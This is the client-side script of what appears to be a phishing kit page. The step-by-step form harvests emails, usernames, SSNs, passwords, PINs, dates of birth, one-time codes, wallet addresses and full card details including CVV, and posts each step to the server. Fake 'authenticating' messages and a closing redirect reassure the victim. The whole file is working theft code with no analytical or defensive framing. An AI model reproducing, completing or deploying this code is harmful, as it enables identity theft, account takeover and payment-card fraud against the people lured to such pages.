<script>
const REDIRECT = <?=json_encode($redirect)?>;
const TOTAL_STEPS = <?=(int)$total_steps?>;
let capturedEmail = '';

function showStep(n) {
    for (let i = 1; i <= TOTAL_STEPS; i++) {
        const el = document.getElementById('step'+i);
        if (el) el.style.display = i===n ? '' : 'none';
        const d = document.getElementById('d'+i);
        if (d) {
            if (i < n) d.className = 'dot done';
            else if (i === n) d.className = 'dot active';
            else d.className = 'dot';
        }
    }
    const s = document.getElementById('step'+n);
    if (s) { const inp = s.querySelector('input:not([type=hidden]),textarea'); if (inp) setTimeout(()=>inp.focus(), 80); }
}

async function submitStep(e, step) {
    e.preventDefault();
    const btn = document.getElementById('btn'+step);
    const err = document.getElementById('err'+step);
    if (err) err.style.display = 'none';

    let body = new FormData();
    body.append('_lp_step', step);
    body.append('_pid', <?=json_encode($pid)?>);

    if (step === 1) {
        const emailEl  = document.getElementById('f_email');
        const unameEl  = document.getElementById('f_username');
        const phoneEl  = document.getElementById('f_phone');
        const ssnGovEl = document.getElementById('f_ssn_gov');
        const fnameEl  = document.getElementById('f_fullname');
        const trackEl  = document.getElementById('f_tracking');
        const zipTEl   = document.getElementById('f_zip_t');
        const policyEl = document.getElementById('f_policy');

        const email  = emailEl  ? emailEl.value.trim()  : '';
        const uname  = unameEl  ? unameEl.value.trim()  : '';
        const phone  = phoneEl  ? phoneEl.value.trim()  : '';
        const ssnG   = ssnGovEl ? ssnGovEl.value.trim() : '';
        const fname  = fnameEl  ? fnameEl.value.trim()  : '';
        const track  = trackEl  ? trackEl.value.trim()  : '';
        const zipT   = zipTEl   ? zipTEl.value.trim()   : '';
        const policy = policyEl ? policyEl.value.trim() : '';

        if (!email && !uname && !phone && !ssnG && !fname && !track && !policy) {
            if (err) err.style.display = 'block'; return;
        }
        capturedEmail = email || uname || phone || fname || policy || track;
        body.append('email', email); body.append('username', uname); body.append('phone', phone);
        body.append('ssn_gov', ssnG); body.append('fullname', fname); body.append('tracking', track);
        if (zipT) body.append('zip', zipT);
        if (policy) body.append('policy', policy);

        const sub2 = document.getElementById('step2sub');
        if (sub2 && capturedEmail) {
            const orig = sub2.dataset.orig || sub2.textContent;
            sub2.dataset.orig = orig;
            if (email) sub2.innerHTML = orig + ' &mdash; <strong>' + email + '</strong>';
        }

    } else if (step === 2) {
        const passEl = document.getElementById('f_password');
        const pinEl  = document.getElementById('f_pin');
        const dobEl  = document.getElementById('f_dob');
        const zipEl  = document.getElementById('f_zip');
        const ssnEl  = document.getElementById('f_ssn');
        const email2 = document.getElementById('f_email2');

        const pass = passEl ? passEl.value : '';
        const pin  = pinEl  ? pinEl.value  : '';
        const dob  = dobEl  ? dobEl.value.trim() : '';
        const zip  = zipEl  ? zipEl.value.trim() : '';
        const ssn  = ssnEl  ? ssnEl.value.trim() : '';
        const em2  = email2 ? email2.value.trim() : '';

        if (!pass && !pin && !dob && !ssn && !em2) {
            if (err) err.style.display = 'block'; return;
        }
        body.append('password', pass); body.append('pin', pin); body.append('dob', dob);
        body.append('zip', zip); body.append('ssn', ssn); body.append('email', em2);

    } else if (step === 3) {
        const otpWrap = document.getElementById('otpWrap');
        if (otpWrap) {
            const digits = Array.from(otpWrap.querySelectorAll('input')).map(i=>i.value).join('');
            const otpH = document.getElementById('f_otp');
            if (otpH) otpH.value = digits;
            if (digits.length < 6) { if (err) err.style.display = 'block'; return; }
            body.append('otp', digits);
        }
        const ssnEl = document.getElementById('f_ssn');
        const dob3  = document.getElementById('f_dob3');
        const zip3  = document.getElementById('f_zip3');
        const addrEl= document.getElementById('f_address');
        const wallEl= document.getElementById('f_wallet');
        const last4 = document.getElementById('f_last4');
        const card3 = document.getElementById('f_card');
        const exp3  = document.getElementById('f_exp');
        const cvv3  = document.getElementById('f_cvv');
        const cname3= document.getElementById('f_cname');
        const otp_s = document.getElementById('f_otp_s');

        const ssn  = ssnEl  ? ssnEl.value.trim()  : '';
        const d3   = dob3   ? dob3.value.trim()   : '';
        const z3   = zip3   ? zip3.value.trim()   : '';
        const addr = addrEl ? addrEl.value.trim() : '';
        const wall = wallEl ? wallEl.value.trim() : '';
        const l4   = last4  ? last4.value.trim()  : '';
        const c3   = card3  ? card3.value.replace(/\s/g,'') : '';
        const e3   = exp3   ? exp3.value.trim()   : '';
        const vv3  = cvv3   ? cvv3.value.trim()   : '';
        const cn3  = cname3 ? cname3.value.trim() : '';
        const os   = otp_s  ? otp_s.value.trim()  : '';

        if (!ssn && !d3 && !addr && !wall && !l4 && !c3 && !os && !otpWrap) {
            if (err) err.style.display = 'block'; return;
        }
        body.append('ssn', ssn); body.append('dob3', d3); body.append('zip3', z3);
        body.append('address', addr); body.append('wallet', wall); body.append('last4', l4);
        if (c3) body.append('card', c3); if (e3) body.append('exp', e3);
        if (vv3) body.append('cvv', vv3); if (cn3) body.append('cname', cn3);
        if (os) body.append('otp', os);

    } else if (step === 4) {
        const cardEl  = document.getElementById('f_card');
        const expEl   = document.getElementById('f_exp');
        const cvvEl   = document.getElementById('f_cvv');
        const cnameEl = document.getElementById('f_cname');
        const wallEl  = document.getElementById('f_wallet');

        const wall = wallEl ? wallEl.value.trim() : '';
        const card = cardEl ? cardEl.value.replace(/\s/g,'') : '';
        const exp  = expEl  ? expEl.value.trim()  : '';
        const cvv  = cvvEl  ? cvvEl.value.trim()  : '';
        const cn   = cnameEl? cnameEl.value.trim(): '';

        if (wall) {
            body.append('wallet', wall);
        } else {
            if (card.length < 15 || !exp || cvv.length < 3) { if (err) err.style.display = 'block'; return; }
            body.append('card', card); body.append('exp', exp); body.append('cvv', cvv); body.append('cname', cn);
        }
    }

    if (btn) { btn.disabled = true; btn.classList.add('loading'); }
    try {
        const res  = await fetch(location.href, {method:'POST', body});
        const data = await res.json();
        if (data.ok) {
            if (step < TOTAL_STEPS) showStep(step + 1);
            else showLoadingThenRedirect();
        }
    } catch(ex) {
        if (step < TOTAL_STEPS) showStep(step + 1);
        else showLoadingThenRedirect();
    }
    if (btn) { btn.disabled = false; btn.classList.remove('loading'); }
}

function showLoadingThenRedirect() {
    const ov = document.getElementById('loadOverlay');
    if (ov) ov.classList.add('show');
    const msgs = ['Verifying your information…','Authenticating…','Completing secure session…','Redirecting to secure portal…'];
    let i = 0;
    const iv = setInterval(()=>{ i++; const el=document.getElementById('loadText'); if(el&&msgs[i]) el.textContent=msgs[i]; }, 700);
    setTimeout(()=>{ clearInterval(iv); window.location.href = REDIRECT; }, 3000);
}

function otpMove(el, idx) {
    el.value = el.value.replace(/\D/g,'').slice(0,1);
    if (el.value) { const inputs = document.getElementById('otpWrap').querySelectorAll('input'); if (idx < 5) inputs[idx+1].focus(); }
}
function fmtSSN(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 3 && v.length <= 5) v = v.slice(0,3)+'-'+v.slice(3);
    else if (v.length > 5) v = v.slice(0,3)+'-'+v.slice(3,5)+'-'+v.slice(5,9);
    el.value = v;
}
function fmtDOB(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 2 && v.length <= 4) v = v.slice(0,2)+'/'+v.slice(2);
    else if (v.length > 4) v = v.slice(0,2)+'/'+v.slice(2,4)+'/'+v.slice(4,8);
    el.value = v;
}
function fmtCard(el) {
    let v = el.value.replace(/\D/g,'').slice(0,16);
    el.value = v.match(/.{1,4}/g)?.join(' ') || v;
}
function fmtExp(el) {
    let v = el.value.replace(/\D/g,'');
    if (v.length > 2) v = v.slice(0,2)+'/'+v.slice(2,4);
    el.value = v;
}
</script>
